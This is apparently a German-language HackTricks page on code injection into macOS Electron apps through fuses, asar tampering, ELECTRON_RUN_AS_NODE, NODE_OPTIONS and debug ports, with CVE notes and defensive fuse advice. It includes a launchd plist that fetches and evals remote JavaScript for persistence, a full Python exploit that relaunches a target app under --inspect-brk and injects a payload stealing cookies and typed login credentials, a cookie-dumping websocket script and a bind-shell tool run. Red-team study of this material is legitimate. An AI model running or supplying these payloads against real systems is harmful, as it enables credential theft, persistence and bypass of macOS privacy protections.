# Injection in macOS Electron Applications

{{#include ../../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Wenn du nicht weißt, was Electron ist, findest du [**hier viele Informationen**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Für den Moment musst du jedoch nur wissen, dass Electron **node** ausführt.\
Und node hat einige **Parameter** und **Umgebungsvariablen**, die verwendet werden können, um **anderen Code auszuführen**, zusätzlich zur angegebenen Datei.

### Electron Fuses

Diese Techniken werden im Folgenden behandelt, aber Electron hat in letzter Zeit mehrere **Security Flags hinzugefügt, um sie zu verhindern**. Dies sind die [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses), und dies sind diejenigen, die verwendet werden, um zu **verhindern**, dass Electron-Anwendungen unter macOS **beliebigen Code laden**:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: Wenn deaktiviert, verhindert dies die Verwendung der Umgebungsvariable **`ELECTRON_RUN_AS_NODE`**, um Code zu injizieren.
- **`EnableNodeCliInspectArguments`**: Wenn deaktiviert, werden Parameter wie `--inspect` und `--inspect-brk` nicht berücksichtigt. Dadurch wird diese Möglichkeit zur Code-Injection verhindert.
- **`EnableEmbeddedAsarIntegrityValidation`**: Wenn aktiviert, wird die geladene **`asar`**-**Datei** von macOS **validiert**. Dadurch wird **Code-Injection** durch eine Änderung des Inhalts dieser Datei **verhindert**.
- **`OnlyLoadAppFromAsar`**: Wenn dies aktiviert ist, wird nicht in der folgenden Reihenfolge nach einer zu ladenden Datei gesucht: **`app.asar`**, **`app`** und schließlich **`default_app.asar`**. Es wird nur `app.asar` überprüft und verwendet. Dadurch wird sichergestellt, dass es in **Kombination** mit dem **`embeddedAsarIntegrityValidation`** Fuse **unmöglich** ist, **nicht validierten Code zu laden**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Wenn aktiviert, verwendet der Browser-Prozess die Datei `browser_v8_context_snapshot.bin` für seinen V8-Snapshot.

Ein weiterer interessanter Fuse, der Code-Injection nicht verhindert, ist:

- **EnableCookieEncryption**: Wenn aktiviert, wird der Cookie-Speicher auf der Festplatte mithilfe von kryptografischen Schlüsseln auf OS-Ebene verschlüsselt.

### Electron Fuses überprüfen

Du kannst diese Flags aus einer Anwendung heraus überprüfen mit:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Ändern von Electron Fuses

Wie in der [**Dokumentation erwähnt**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), ist die Konfiguration der **Electron Fuses** im **Electron binary** enthalten, das an irgendeiner Stelle den String **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** enthält.<sup>[[1]](#references)</sup>

In macOS-Anwendungen befindet sich dieser typischerweise in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Du könntest diese Datei in [https://hexed.it/](https://hexed.it/) laden und nach dem vorherigen String suchen. Nach diesem String siehst du in ASCII eine Zahl „0“ oder „1“, die angibt, ob jede fuse deaktiviert oder aktiviert ist. Ändere einfach den Hex-Code (`0x30` ist `0` und `0x31` ist `1`), um die **fuse-Werte zu ändern**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Beachte, dass die Anwendung nicht mehr ausgeführt wird, wenn du versuchst, die **`Electron Framework`-Binary** innerhalb einer Anwendung mit diesen geänderten Bytes zu **überschreiben**.

## RCE durch Hinzufügen von Code zu Electron Applications

Es könnte **externe JS/HTML-Dateien** geben, die eine Electron App verwendet. Ein Angreifer könnte daher Code in diese Dateien injizieren, deren Signatur nicht überprüft wird, und beliebigen Code im Kontext der App ausführen.

> [!CAUTION]
> Allerdings gibt es derzeit 2 Einschränkungen:
>
> - Die Berechtigung **`kTCCServiceSystemPolicyAppBundles`** ist erforderlich, um eine App zu ändern, daher ist dies standardmäßig nicht mehr möglich.
> - Die kompilierte **`asap`-Datei** hat normalerweise die fuses **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** aktiviert.
>
> Dadurch wird dieser Angriffspfad komplizierter (oder unmöglich).

Beachte, dass sich die Anforderung von **`kTCCServiceSystemPolicyAppBundles`** umgehen lässt, indem die Anwendung in ein anderes Verzeichnis (wie **`/tmp`**) kopiert, der Ordner **`app.app/Contents`** in **`app.app/NotCon`** umbenannt, die **asar**-Datei mit deinem **bösartigen** Code geändert, anschließend wieder in **`app.app/Contents`** umbenannt und die Anwendung ausgeführt wird.

Du kannst den Code aus der asar-Datei mit folgendem Befehl entpacken:
```bash
npx asar extract app.asar app-decomp
```
Und packe es nach der Änderung wieder mit:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE mit ELECTRON_RUN_AS_NODE

Laut [**der Dokumentation**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node) startet diese Umgebungsvariable den Prozess als normalen Node.js-Prozess, wenn sie gesetzt ist.<sup>[[6]](#references)</sup>
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Wenn das fuse **`RunAsNode`** deaktiviert ist, wird die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ignoriert, und dies funktioniert nicht.

### Injection aus dem App-Plist

Wie [**hier vorgeschlagen**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), könntest du diese Umgebungsvariable in einem plist missbrauchen, um Persistenz aufrechtzuerhalten:<sup>[[2]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE mit `NODE_OPTIONS`

Du kannst die Payload in einer anderen Datei speichern und ausführen:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Wenn das Fuse **`EnableNodeOptionsEnvironmentVariable`** **deaktiviert** ist, ignoriert die App die Umgebungsvariable **NODE_OPTIONS** beim Start, es sei denn, die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ist gesetzt. Diese wird ebenfalls ignoriert, wenn das Fuse **`RunAsNode`** deaktiviert ist.
>
> Wenn du **`ELECTRON_RUN_AS_NODE`** nicht setzt, wird der **Fehler** `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.` angezeigt.

### Injection aus der App-Plist

Du könntest diese Umgebungsvariable in einer Plist missbrauchen, um durch das Hinzufügen dieser Schlüssel Persistenz aufrechtzuerhalten:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE mit Inspektion

Laut [**diesem Artikel**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) wird ein **Debug-Port geöffnet**, wenn Sie eine Electron-Anwendung mit Flags wie **`--inspect`**, **`--inspect-brk`** und **`--remote-debugging-port`** ausführen. Dadurch können Sie eine Verbindung herstellen (zum Beispiel über Chrome unter `chrome://inspect`) und **Code injizieren** oder sogar neue Prozesse starten.<sup>[[7]](#references)</sup>\
Zum Beispiel:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
In [**diesem Blogpost**](https://hackerone.com/reports/1274695) wird dieses Debugging missbraucht, um einen headless chrome **beliebige Dateien an beliebige Speicherorte herunterladen** zu lassen.<sup>[[8]](#references)</sup>

> [!TIP]
> Wenn eine App über eine eigene Methode verfügt, um zu prüfen, ob Umgebungsvariablen oder Parameter wie `--inspect` gesetzt sind, könntest du versuchen, dies zur Laufzeit mit dem Argument `--inspect-brk` zu **umgehen**, wodurch die **Ausführung** am Anfang der App **angehalten** und ein Bypass ausgeführt wird (beispielsweise durch das Überschreiben der Argumente oder der Umgebungsvariablen des aktuellen Prozesses).

Das Folgende war ein Exploit, bei dem es durch das Überwachen und Ausführen der App mit dem Parameter `--inspect-brk` möglich war, den vorhandenen benutzerdefinierten Schutz zu umgehen (durch Überschreiben der Prozessparameter, um `--inspect-brk` zu entfernen) und anschließend einen JS-Payload zu injizieren, um Cookies und Zugangsdaten aus der App zu dumpen:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> Wenn der Fuse **`EnableNodeCliInspectArguments`** deaktiviert ist, ignoriert die Anwendung **Node-Parameter** (wie `--inspect`) beim Start, sofern die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** nicht gesetzt ist. Diese wird ebenfalls ignoriert, wenn der Fuse **`RunAsNode`** deaktiviert ist.
>
> Du könntest jedoch weiterhin den **Electron-Parameter `--remote-debugging-port=9229`** verwenden, aber der vorherige Payload würde nicht funktionieren, um andere Prozesse auszuführen.

Mit dem Parameter **`--remote-debugging-port=9222`** ist es möglich, einige Informationen aus der Electron-Anwendung zu stehlen, etwa den **Verlauf** (mit GET-Befehlen) oder die **Cookies** des Browsers (da sie innerhalb des Browsers **entschlüsselt** werden und es einen **JSON-Endpunkt** gibt, der sie ausgibt).

Wie das funktioniert, kannst du [**hier**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) und [**hier**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) lernen. Verwende dazu das automatische Tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) oder ein einfaches Script wie: <sup>[[9]](#references)[[10]](#references)</sup>
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injection aus der App-Plist

Du könntest diese env-Variable in einer plist missbrauchen, um durch das Hinzufügen dieser Keys Persistenz aufrechtzuerhalten:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass durch Ausnutzen älterer Versionen

> [!TIP]
> Der TCC-Daemon von macOS überprüft die ausgeführte Version der Anwendung nicht. Wenn du daher **keinen Code in eine Electron-Anwendung injizieren kannst**, indem du eine der vorherigen Techniken verwendest, könntest du eine ältere Version der APP herunterladen und Code in diese injizieren, da sie weiterhin die TCC-Berechtigungen erhält (außer der Trust Cache verhindert dies).

## Nicht-JS-Code ausführen

Die vorherigen Techniken ermöglichen es dir, **JS-Code innerhalb des Prozesses der Electron-Anwendung auszuführen**. Denke jedoch daran, dass **untergeordnete Prozesse unter demselben Sandbox-Profil wie die übergeordnete Anwendung ausgeführt werden** und deren TCC-Berechtigungen **übernehmen**.\
Wenn du daher beispielsweise Entitlements missbrauchen möchtest, um auf die Kamera oder das Mikrofon zuzugreifen, könntest du einfach **eine andere Binary aus dem Prozess heraus ausführen**.

## Bemerkenswerte Electron-macOS-Schwachstellen (2023-2024)

### CVE-2023-44402 – ASAR-Integritätsumgehung

Electron ≤22.3.23 und verschiedene 23-27 Pre-Releases erlaubten es einem Angreifer mit Schreibzugriff auf den Ordner `.app/Contents/Resources`, die Fuses `embeddedAsarIntegrityValidation` **und** `onlyLoadAppFromAsar` zu umgehen. Der Fehler war eine *Verwechslung des Dateityps* im Integritätsprüfer, durch die ein speziell erstelltes **Verzeichnis namens `app.asar`** anstelle des validierten Archivs geladen werden konnte. Dadurch wurde beliebiges JavaScript, das sich innerhalb dieses Verzeichnisses befand, beim Start der Anwendung ausgeführt. Somit waren selbst Anbieter, die die Hardening-Empfehlungen befolgt und beide Fuses aktiviert hatten, unter macOS weiterhin verwundbar.<sup>[[3]](#references)</sup>

Gepatchte Electron-Versionen: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** und **27.0.0-alpha.7**. Angreifer, die eine Anwendung mit einem älteren Build finden, können `Contents/Resources/app.asar` mit ihrem eigenen Verzeichnis überschreiben, um Code mit den TCC-Entitlements der Anwendung auszuführen.<sup>[[3]](#references)</sup>

### CVE-Cluster „RunAsNode“ / „enableNodeCliInspectArguments“ von 2024

Im Januar 2024 wurde durch eine Reihe von CVEs (CVE-2024-23738 bis CVE-2024-23743) hervorgehoben, dass viele Electron-Apps mit weiterhin aktivierten Fuses **RunAsNode** und **EnableNodeCliInspectArguments** ausgeliefert werden. Ein lokaler Angreifer kann das Programm daher mit der Umgebungsvariable `ELECTRON_RUN_AS_NODE=1` oder Flags wie `--inspect-brk` erneut starten, um es in einen *generischen* Node.js-Prozess umzuwandeln und alle Sandbox- und TCC-Berechtigungen der Anwendung zu übernehmen.<sup>[[4]](#references)</sup>

Obwohl das Electron-Team die Einstufung als „kritisch“ bestritten und darauf hingewiesen hat, dass ein Angreifer bereits lokale Codeausführung benötigt, ist das Problem während der Post-Exploitation weiterhin nützlich, da es jedes verwundbare Electron-Bundle in eine *Living-off-the-Land*-Binary verwandelt, die beispielsweise Kontakte, Fotos oder andere vertrauliche Ressourcen lesen kann, für die der Desktop-App zuvor Berechtigungen erteilt wurden.<sup>[[4]](#references)</sup>

Defensive Empfehlungen der Electron-Maintainer:<sup>[[4]](#references)</sup>

* Deaktiviere die Fuses `RunAsNode` und `EnableNodeCliInspectArguments` in Production-Builds.
* Verwende die neuere **UtilityProcess**-API, wenn deine Anwendung rechtmäßig einen Node.js-Hilfsprozess benötigt, anstatt diese Fuses erneut zu aktivieren.

## Automatische Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Das Tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) kann einfach verwendet werden, um **verwundbare Electron-Anwendungen** zu finden, die installiert sind, und Code in sie zu injizieren. Dieses Tool versucht, die **`--inspect`**-Technik zu verwenden:

Du musst es selbst kompilieren und kannst es anschließend wie folgt verwenden:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki wurde entwickelt, um Electron applications zu backdooren, indem die JavaScript-Dateien der Anwendungen durch die Loki Command & Control JavaScript-Dateien ersetzt werden.


## Referenzen

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [MacOS Injection via Third-Party Frameworks - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [ASAR Integrity bypass via filetype confusion (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [Statement regarding 'runAsNode' CVEs - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizing macOS Privacy - A New Weapon in Your Red Teaming Armory - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Environment Variables | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Why Electron apps can't store your secrets confidentially: --inspect option](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [HackerOne Report #1274695 - Electron debugging abused to download arbitrary files](https://hackerone.com/reports/1274695)
- [9] [Hands in the Cookie Jar: Dumping Cookies with Chromium's Remote Debugger Port - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Debugging Cookie Dumping Failures with Chromium's Remote Debugger - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)

{{#include ../../../banners/hacktricks-training.md}}
